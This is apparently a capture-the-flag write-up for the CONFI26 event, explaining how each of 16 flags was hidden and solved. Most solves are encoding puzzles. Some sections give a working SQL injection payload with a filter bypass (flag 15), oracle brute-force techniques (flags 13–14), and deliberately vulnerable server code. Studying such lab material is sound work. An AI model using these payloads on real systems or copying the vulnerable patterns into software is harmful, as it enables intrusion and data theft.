# CONFI26 — Post-Event Writeup

Thanks for playing! Below is the full walkthrough of all 16 flags from
the hunt: where each one hid, what made it tick, and how to take it
apart. If you cleared the board, this is your chance to compare notes.
If a couple of them got away, here's how they came open.

All flags used the format `confi{...}`.

## TL;DR — one line per flag

| # | Flag | Surface | Trick |
|---|---|---|---|
| 1 | `confi{the_one_you_will_find_really_quick}` | `GET /` | `<meta name="description">` in the HTML head |
| 2 | `confi{the_one_in_css_file_code}` | `app/globals.css` | bogus `flag:"..."` property = ASCII-code string |
| 3 | `confi{the_one_in_svg_file_that_says_flag}` | `GET /flag.svg` | SVG `<path>` data **draws** the flag text (no plaintext) |
| 4 | `confi{the_one_in_the_glitch}` | `SkyFx.tsx` (JS bundle) | hex literal `0x636f...` inside `glitch()` |
| 5 | `confi{the_one_in_the_music}` | `GET /anthem_for_stars.mp3` | Base32 inside an ID3 `TXXX:Whaaat` frame |
| 6 | `confi{the_one_in_the_lyrics}` | same MP3, audible | sung in the AI-generated track — **listen** 🎧 |
| 7 | `confi{the_one_on_the_dark_side}` | `GET /behind.stl` | STL mesh parented to the camera, *behind* it |
| 8 | `confi{the_one_for_meeee}` | `GET /api/me` | authenticated JSON response carries the flag |
| 9 | `confi{the_one_you_will_find_in_api_doczz}` | `GET /api/docs` | HTML comment at top of the docs page |
| 10 | `confi{the_one_with_the_broken_smiles}` | `GET /api/v2/smile_now` | Content-Type lies (`utf-16le` over UTF-8 bytes); flag in HTML comment |
| 11 | `confi{the_one_who_got_away}` | `/api/v2/lost_station` | text-adventure across 333 rooms; one of them holds the body |
| 12 | `confi{the_one_factored}` | `GET /api/v2/auth_lab` | textbook RSA with a 192-bit modulus — factor it |
| 13 | `confi{the_one_that_you_will_never_ever_guess_sw33theart}` | `POST /api/v2/guess_the_flag` | `"Flag incomplete"` vs `"Incorrect flag"` = prefix oracle |
| 14 | `confi{the_one_that_takes_long_t!me}` | `POST /api/v2/guess_the_flag_2` | same oracle, leaked via 2 s response time |
| 15 | `confi{the_one_that_escaped_the_quote}` | `GET /api/v2/find_flag?input=` | SQLi (UNION filter bypass) → enumerate → other table |
| 16 | `confi{the_one_where_robots_dance_in_space}` | `GET /api/v2/confidance` | raw base64 chunk = 1/60 of an MP4, indexed by UTC second |

---

## Flag 1 — Page metadata

**Where:** the landing page's HTML `<head>`.

**Trick:** the flag is rendered into `<meta name="description"
content="confi{...}">` by Next.js, straight from `metadata.description`
in `app/layout.tsx`. A view-source on `/` is enough.

```bash
curl -s / | grep -oE 'description"[^>]+confi[^"]+'
# → description" content="confi{the_one_you_will_find_really_quick}"
```

This was the warm-up — designed to make sure no team left empty-handed.

## Flag 2 — Fake CSS property in a keyframe

**Where:** `app/globals.css`, inside `@keyframes glitch-rgb-r`, the `90%`
step had an extra "property":

```css
flag: "9911111010210512311610410195111110101951051109599...";
```

**Trick:** `flag` isn't a real CSS property — the browser just ignores
it. The string is a stream of decimal ASCII codes. Greedy decode
(`3-digit-then-fallback-to-2-digit`) gives readable text.

**Solve:**

```python
s='9911111010210512311610410195111110101951051109599115115951021051081019599111100101125'
out=''; i=0
while i<len(s):
    for L in (3,2):
        v=int(s[i:i+L])
        if 32<=v<=126: out+=chr(v); i+=L; break
    else: break
print(out)
# → confi{the_one_in_css_file_code}
```

## Flag 3 — SVG that draws its own flag

**Where:** `GET /flag.svg` — a ~32 KB SVG with a viewBox of
`0 0 11812 945` (the giveaway: extreme width-to-height ratio).

**Trick:** the flag string is **not** in `<text>`, `<title>`, `<desc>`,
or any comment. Every glyph of `confi{the_one_in_svg_file_that_says_flag}`
is rendered as Bezier `<path>` data. You can't grep it — you have to
look at it.

The SVG was preloaded by `layout.tsx` as a hidden 1×1 image, visible in
the Network tab or in any bundle grep for `.svg`.

You need to open it in any SVG editor, and remove black box that hides the real flag.

## Flag 4 — Hex literal in the glitch handler

**Where:** `app/components/SkyFx.tsx`, inside `glitch()`:

```js
const shape = 0x636f6e66697b7468655f6f6e655f696e5f7468655f676c697463687d;
void shape;
```

The `void shape;` was a deliberate trick to keep TypeScript happy
without breaking the literal.

**Trick:** the glitch flash fires when you submit a wrong flag in the
modal — that's the nudge to look at `SkyFx`. In the bundled JS / source
map, the literal is plain hex. Decode pairs of nibbles as ASCII:

```python
import binascii
print(binascii.unhexlify(
  '636f6e66697b7468655f6f6e655f696e5f7468655f676c697463687d'
).decode())
# → confi{the_one_in_the_glitch}
```

## Flag 5 — Base32 in an MP3 ID3 frame

**Where:** `GET /anthem_for_stars.mp3` — preloaded by `layout.tsx`. The
file's ID3v2.3 header had a custom `TXXX` user-text frame named
`Whaaat`, whose value was:

```
MNXW4ZTJPN2GQZK7N5XGKX3JNZPXI2DFL5WXK43JMN6Q====
```

**Trick:** dump the tags (`exiftool`, `ffprobe`, `id3v2`, even
`strings`). A frame literally named *Whaaat* is the "look at me" sign.
The trailing `====` is the dead giveaway it's base32 (RFC 4648).

```bash
curl -s /anthem_for_stars.mp3 \
  | strings | grep -m1 -oE '[A-Z0-9]{40,}=*'
# → MNXW4ZTJPN2GQZK7N5XGKX3JNZPXI2DFL5WXK43JMN6Q====

python3 -c "import base64; print(base64.b32decode(
'MNXW4ZTJPN2GQZK7N5XGKX3JNZPXI2DFL5WXK43JMN6Q====').decode())"
# → confi{the_one_in_the_music}
```

## Flag 6 — Sung in the song 🎧

**Where:** the same MP3 — `anthem_for_stars.mp3`.

**Trick:** the song *"Hallucinates Crawling Stars"* (Suno-generated)
literally sings the flag at one point. There is no decode, no tool, no
exfil — you had to play the audio and listen for the vocal hook
`confi the one in the lyrics`.

A lot of teams found flag 5 (the base32) and assumed the music puzzle
was done. The two flags shared an MP3 but not a solve path.

## Flag 7 — The dark side of the camera

**Where:** `GET /behind.stl` — publicly served.

**Trick:** in `app/components/Scene.tsx` the STL is loaded by
`STLLoader`, parented to the camera, and placed at `position(0, 0, 8)`
— i.e. behind the near plane along the camera's local Z axis. In the
running scene it's invisible because you can never rotate behind your
own eye. The filename + the flag's "dark side" wording were the only
hints.

Download and open it in any STL viewer (MeshLab, Blender, Windows 3D
Viewer, [viewstl.com](https://www.viewstl.com)). The mesh extrudes the
literal flag string.

```bash
curl -s -o /tmp/behind.stl /behind.stl
# then open /tmp/behind.stl in an STL viewer
```

## Flag 8 — Authenticated `/api/me`

**Where:** `GET /api/me` — but only when authenticated.

**Trick:** unauthenticated callers got `{"authenticated": false}` and
nothing else. With a valid session cookie, the JSON response contained
the team profile **and** a `flag` field.

```bash
# Unauthed — flag hidden
curl -s /api/me
# → {"authenticated":false}

# Authed (with a valid session cookie)
curl -s -H "Cookie: <session>" /api/me \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['flag'])"
# → confi{the_one_for_meeee}
```

Registering a team via the passkey modal on the homepage was enough.

## Flag 9 — Comment at the top of `/api/docs`

**Where:** `GET /api/docs` — the v2 endpoint catalogue page.

**Trick:** the HTML began with the literal comment

```html
<!--- confi{the_one_you_will_find_in_api_doczz} --->
```

Note the SGML-style triple dash. Browsers tolerate it, and `view-source`
or a `curl | head -1` exposes it immediately:

```bash
curl -s /api/docs | head -1
# → <!--- confi{the_one_you_will_find_in_api_doczz} --->
```

## Flag 10 — Content-Type lies

**Where:** `GET /api/v2/smile_now`.

**Trick:** the body was a UTF-8-encoded ASCII smiley with a trailing
`<!-- confi{...} -->`. The handler shipped it with
`Content-Type: text/html; charset=utf-16le`, so a browser tried to
decode the UTF-8 bytes as little-endian UTF-16 and rendered garbage.

Three ways out:

1. `curl` — `curl` doesn't decode, you get the raw bytes.
2. View Source — shows the raw response.
3. DevTools → "override encoding to UTF-8".

```bash
curl -s /api/v2/smile_now | grep -oE 'confi\{[^}]+\}'
# → confi{the_one_with_the_broken_smiles}
```

## Flag 11 — Lost Station text adventure

**Where:** `/api/v2/lost_station` (entry → 307 redirect) and
`/api/v2/lost_station/<uuid>` (each room).

**Trick:** a 333-room interactive fiction across 11 sections — `cryo`,
`quarters`, `common`, `medbay`, `science`, `hydroponics`, `bridge`,
`engineering`, `reactor`, `cargo`, `vents`. 33 of those rooms were
death screens. The flag was scratched into the panel beside the body
of a corpse named Holloway, in a room called **Holloway's Refuge**
(section `vents`).

> "Scratched into the panel beside his head, in trembling block
> letters, is the message: `confi{the_one_who_got_away}`"

**Shortest path** start → flag room was **21 edges**. The canonical
21-step path went:

cryo `Decommissioned Pod Bank` → `Cryo Chaplain's Alcove` →
`Hibernation Prep Room` → `Technician's Nook` → `Cryo Pod 12` →
medbay `Dental Operatory` → `Biohazard Locker` →
vents `Plenum Crawl East` → `Climb Shaft to Engineering` →
`Hidden Bypass` → `Plenum Chamber West` → `Vertical Climb Shaft` →
`Deadend Crawl 12-S` → `T-Junction at Frame 31` →
`Dripping Vertical Drop` → `Vent Termination C-8` →
`Exhaust Port D-3` → `Nest Chamber` → `Junction Box J-12` →
`Lateral Crawl 4-North` → `Narrow Squeeze 9-B` → `Holloway's Refuge`.

There was no map endpoint and no shortcut. Two legit solves:

- Play it like a roguelike — read descriptions, avoid death rooms.
- Scrape the graph room-by-room (each room exposes its outgoing edges)
  and BFS from the start UUID to a room whose description contains
  `confi{`.

```bash
# Entry must 307 to the start room
curl -sI /api/v2/lost_station | grep -i location
# → location: /api/v2/lost_station/adee903b-1588-4a89-b75d-aa02380089cd

# Flag room
curl -s /api/v2/lost_station/78136a3d-4dc9-4b89-8b1c-ea52b4a75b9e \
  | grep -oE 'confi\{[^}]+\}'
# → confi{the_one_who_got_away}
```

## Flag 12 — RSA AuthLab (factor the modulus)

**Where:** `GET /api/v2/auth_lab` — served as `Content-Type:
text/javascript`. It looked like a "test script" for a client-side
authentication system, with three constants:

- `PUBLIC_KEY` (PEM — parses to `n` and `e`)
- `CHALLENGE` (base64 — decodes to ciphertext `c`)
- `verify(password)` — checks `password^e mod n == c`

**Numbers (as published):**

- `n = 4799643709665892850329726033956443991247211239439615194949`
  (192 bits)
- `e = 65537`
- `c = 89793292522531055144672200387340232965153755844404418623`

**Trick:** textbook RSA — except the modulus is **192 bits** (58 decimal
digits). Real-world RSA is 2048+. A 192-bit `n` factors in minutes on
any modern laptop with `yafu`, `sympy.factorint`, or a FactorDB cache
hit.

**Solver:**

```python
import base64
from sympy import factorint

# parse PEM from /api/v2/auth_lab response
der = base64.b64decode(
  "MDQwDQYJKoZIhvcNAQEBBQADIwAwIAIZAMO+nlQFoq6eEUQEvJRC3ACqqn48Oqz3RQIDAQAB"
)
i = [0]
def L():
    n = der[i[0]]; i[0] += 1
    if n < 128: return n
    k = n & 0x7f; v = 0
    for _ in range(k): v = (v<<8)|der[i[0]]; i[0]+=1
    return v
def T(t):
    assert der[i[0]] == t; i[0] += 1; return L()
def I():
    l = T(0x02); v = 0
    for _ in range(l): v = (v<<8)|der[i[0]]; i[0]+=1
    return v
T(0x30); i[0] += T(0x30)            # skip AlgorithmIdentifier
T(0x03); i[0] += 1                  # BIT STRING + unused-bits
T(0x30)
n, e = I(), I()

c = int.from_bytes(base64.b64decode("A6l8V+zPvTZoKqwRgjzkyWOkihaA0Zg/"), "big")
p, q = factorint(n).keys()
d = pow(e, -1, (p-1)*(q-1))
m = pow(c, d, n)
print(m.to_bytes((m.bit_length()+7)//8, "big").decode())
# → confi{the_one_factored}
```

Wall time on an M-series MacBook: roughly 1–5 minutes, with factoring
dominating.

## Flag 13 — Prefix oracle

**Where:** `POST /api/v2/guess_the_flag` with
`Content-Type: application/json` and body `{"guess":"…"}`.

**Server logic:**

```ts
if (guess === FLAG)        return "Correct flag";
if (FLAG.startsWith(guess)) return "Flag incomplete";
return "Incorrect flag";
```

**Trick:** the response leaks **whether your guess is a prefix of the
flag**. The empty string counts as a prefix → "Flag incomplete". Brute
one character at a time: maintain a known prefix, iterate the printable
ASCII range, look for the one candidate that returns `"Flag incomplete"`.
For a ~50-char flag with ~95 printable characters, that's under 5000
requests — seconds of wall time.

**Quick probe:**

```bash
for g in '' 'confi' 'confi{x' '$WRONG'; do
  r=$(curl -s -X POST -H 'Content-Type: application/json' \
      -d "{\"guess\":\"$g\"}" /api/v2/guess_the_flag)
  printf "%-20s -> %s\n" "$g" "$r"
done
# ''       -> {"result":"Flag incomplete"}
# 'confi'  -> {"result":"Flag incomplete"}
# 'confi{x'-> {"result":"Incorrect flag"}
# '$WRONG' -> {"result":"Incorrect flag"}
```

The three-state oracle is the entire vulnerability.

## Flag 14 — Timing oracle (same idea, harder)

**Where:** `POST /api/v2/guess_the_flag_2`.

**Trick:** the body now **always** says `"Correct flag"` or `"Incorrect
flag"` — the `"Flag incomplete"` state is gone. But when the guess is a
non-empty prefix of the real flag, the handler `await`s a 2-second
`setTimeout` before responding.

Same brute-force as flag 13, with response time as the side channel.

```bash
time curl -s -o /dev/null -X POST -H 'Content-Type: application/json' \
  -d '{"guess":"xxx"}' /api/v2/guess_the_flag_2
# real ~0.09 s   (no prefix)

time curl -s -o /dev/null -X POST -H 'Content-Type: application/json' \
  -d '{"guess":"confi"}' /api/v2/guess_the_flag_2
# real ~2.01 s   (prefix hit)
```

A solver should drop the threshold around `~1.5 s` to absorb network
jitter, and ideally do a couple of trials per candidate to defeat the
occasional false positive.

## Flag 15 — SQLi with a UNION-filter bypass

**Where:** `GET /api/v2/find_flag?input=…`.

**Backing store:** in-memory SQLite (`sql.js`), seeded on first request
with two tables:

- `flags(id, name)` — 103 funny decoy flag names
- `"real flag"(id, value)` — single row, the real flag

**Server logic:**

```ts
if (input === null || input === "") return 400 "Missing input param";
const sanitized = input.replace(/union/i, "");
const sql =
  `SELECT id, name FROM flags WHERE name LIKE '%${sanitized}%'`
  + ` ORDER BY id LIMIT 50`;
```

**Two bugs on display:**

1. The user input is concatenated into a `LIKE` clause — close the
   quote with `'` and you have full SQLi.
2. The "protection" is `String.prototype.replace` with a **non-global**
   regex. It strips only the *first* `union`. Nesting the keyword
   inside itself defeats it: `UNunionION` → after the inner `union` is
   removed → `UNION`.

**Kill-chain:**

1. **Confirm SQLi.** `?input=' OR 1=1 --` → all 103 rows come back.
2. **Notice the filter.** `?input=' UNION SELECT 1,'x'--` → the
   response includes a `query` field showing the literal SQL — `UNION`
   has been stripped, leaving a syntax error.
3. **Bypass + enumerate.**
   `?input=' UNunionION SELECT 1, sql FROM sqlite_master --` reveals
   the schema, including `"real flag"`.
4. **Exfiltrate.**
   `?input=' UNunionION SELECT id, value FROM "real flag" --`
   returns the flag. Double-quoted identifier is mandatory because of
   the space in the table name (backticks also work in sqlite).

**Final payload (URL-encoded):**

```
/api/v2/find_flag?input=%27%20UNunionION%20SELECT%20id%2C%20value%20FROM%20%22real%20flag%22%20--
```

## Flag 16 — Confidance (one frame per second)

**Where:** `GET /api/v2/confidance`.

**Trick:** the handler loads `robots.mp4`, base64-encodes the whole
thing once, slices the resulting string into 60 equal-sized chunks
(`chunkSize = ceil(L / 60)`), and on every request returns **just the
chunk indexed by `new Date().getUTCSeconds()`** as raw `text/plain` —
no JSON, no `part`/`total`/`server_time` metadata. `dynamic =
"force-dynamic"` and `Cache-Control: no-store` keep it uncached.

```
$ curl -s /api/v2/confidance
9fccNeNQZqv28k1VwQqB6zW8Rmxlexrs652KnIdYWRcl8…   # 89_521-char base64 blob
```

**Numbers:** `L = 5_371_256` (base64 length), `chunkSize = 89_521`. The
chunk served at UTC second `59` is `89_517` chars (`L − 59·chunkSize`);
the other 59 are full size. Concatenating chunks `0..59` in order
reproduces `base64(file)` byte-for-byte. Decoded → MP4 → playable, with
the flag burned into the video.

**Recognition steps:**

1. Hit the endpoint once. You get only a base64 blob — no hint about
   how many parts exist or which one you've got.
2. Hit it a second later. The body has changed.
3. The endpoint name *Confidance* plus the docs line *"the server keeps
   the beat, one frame per second"* point at the clock as the index.
4. Realise: the index is `getUTCSeconds()` (0..59), so 60 distinct
   chunks, concatenated in order, decode to base64-encoded MP4.

**Collector + assembler (with no metadata in the body, label each
capture by the HTTP `Date` response header — that matches the server's
UTC clock exactly):**

```bash
mkdir -p parts
while [ "$(ls parts 2>/dev/null | wc -l)" -lt 60 ]; do
  raw=$(curl -sD - /api/v2/confidance)
  body=$(printf '%s' "$raw" | awk 'b{print} /^\r?$/{b=1}')
  date_hdr=$(printf '%s' "$raw" | awk -F': ' 'tolower($1)=="date"{print $2; exit}' | tr -d '\r')
  # Parse "Mon, 25 May 2026 03:50:30 GMT" → SS  (use gdate on macOS)
  p=$(date -u -d "$date_hdr" +%S 2>/dev/null || gdate -u -d "$date_hdr" +%S)
  f="parts/$(printf '%02d' "$p").b64"
  [ -f "$f" ] || printf '%s' "$body" > "$f"
  sleep 1
done
cat parts/*.b64 | base64 -d > robots.mp4
open robots.mp4
```

A simpler version that uses the local clock will mis-label a couple of
slots near second boundaries — just rerun until all 60 are filled.

---

## Closing notes

A few patterns worth taking home:

- **Surface awareness pays.** Flags 1, 3, 5, 6, 7, 9, 10 needed no code
  reading at all — just curiosity about every asset the page loaded,
  every header in every response, and every file in DevTools' Sources
  tab.
- **Side channels are real bugs.** Flag 13 leaked through three reply
  variants. Flag 14 leaked through 2 seconds of `setTimeout`. Same
  exploit; the only thing that changed was where you read the bit.
- **Filters fail open.** Flag 15's defense was `replace(/union/i, "")`
  — one call, non-global. A few hundred lines of "we sanitised the
  input" can fall to a single regex flag.
- **Small numbers are small.** Flag 12's RSA was textbook-correct in
  every way except the size of `n`. The crypto wasn't broken — the
  parameters were.
- **Don't trust the wrapper.** Flag 16 had no JSON, no field labels, no
  "frame 17 of 60". You had to notice the rotation, infer the index
  source from the clock, and trust that 60 chunks in order would round-
  trip to a file.

Thanks for playing CONFI26. If you have a writeup of your own, send it
our way — we read every one.
